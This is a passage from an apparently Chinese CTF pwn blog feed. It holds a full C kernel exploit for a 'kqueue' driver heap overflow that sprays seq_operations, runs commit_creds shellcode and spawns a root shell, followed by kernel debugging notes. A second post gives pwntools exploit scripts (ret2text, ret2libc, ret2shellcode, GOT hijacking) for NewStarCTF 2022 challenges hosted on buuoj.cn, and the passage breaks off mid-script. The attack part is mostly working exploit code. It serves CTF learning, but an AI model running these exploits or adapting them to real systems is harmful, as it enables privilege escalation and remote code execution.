class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12 ,[rsp+0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12 ,0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13 ,r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12 ,0x8c580;&quot;</span><br>        <span class="hljs-string">&quot;add r13 ,0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;xor rdi ,rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br><br>    );<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries ,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xDEADC0DE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data =data,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xDAADEEEE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx=queue_idx,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xBADDCAFE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .max_entries=max_entries,<br>        .data_size =data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xB105BABE</span>,&amp;req);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    save_status();<br>    root_rip = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;open /dev/kqueue failed!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span> ;i&lt;<span class="hljs-number">0x20</span>;i++)<br>        data[i]=(<span class="hljs-type">size_t</span>) shellcode ;<br>    <br>    createQueue(<span class="hljs-number">0xffffffff</span>,<span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,data);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x200</span>;i++)<br>        seq_fd[i]=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">0x200</span> ;i++)<br>        read(seq_fd[i],data,<span class="hljs-number">1</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功提权<img src="/2022/11/19/0x06kernelheapoverflow/06kernelheapoverflow.png" alt="06kernelheapoverflow"></p><h3 id="0x04再记调试方法">0x04再记调试方法</h3><p>在qemu中查找kqueue.ko的.text段的地址</p><p>需要root权限，我们可以在init中修改1000为0方便我们调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/module/kqueue/sections/.text<br></code></pre></td></tr></table></figure><p>启动自己解压缩bzimage里面的./vmlinux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><p>解压bzImage命令,extract-vmlinux文件gitbub取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><p>在gdb中载入驱动kqueue.ko的符号地址</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">add</span><span class="language-bash">-symbol-file ./kqueue.ko 0xffffffffc00dc000</span><br></code></pre></td></tr></table></figure><p>然后连接端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>可以断指定函数</p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022NewStarCTF PWN</title>
    <link href="/2022/11/16/newstarctf2022/"/>
    <url>/2022/11/16/newstarctf2022/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>今年9~10月的比赛，题目从易到难,知识面广，还是很不错的，主要最近不太想学kernel pwn，有空就来复现一下这比赛的pwn</p><h2 id="WEEK1">WEEK1</h2><h3 id="ret2text：">ret2text：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25509)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br>pop_rdi=<span class="hljs-number">0x4007d3</span><br>backdoor=<span class="hljs-number">0x400708</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="calc：">calc：</h3><p>用python的eval函数自动计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./cala&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25712</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    ru(<span class="hljs-string">&#x27;What\&#x27;s the answer? &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">&#x27;=&#x27;</span>,drop=<span class="hljs-literal">True</span>).replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>))))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc：">ret2libc：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29708</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------</span><br>pop_rdi=<span class="hljs-number">0x400753</span><br>ret=<span class="hljs-number">0x40050e</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br>got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x1b45bd</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2shellcode：">ret2shellcode：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./shell&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25903</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;Hello my friend.Any gift for me?\n&#x27;</span>,asm(shellcraft.sh()))<br>sla(<span class="hljs-string">&#x27;Anything else?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x233000</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="fallw1nd’s-gift：">fallw1nd’s gift：</h3><p>GOT Hijacking，</p><p>gdb调试来确定该怎样输入addr</p><p>用objdump -d -M inte ./fallw1nd’s gift 取找puts的plt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./fallw1nd_gift&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25419</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------</span><br>ru(<span class="hljs-string">&#x27;gift as reward:\n&#x27;</span>)<br>puts_got=<span class="hljs-built_in">eval</span>(rc(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)<br>base=puts_got-libc.sym[<span 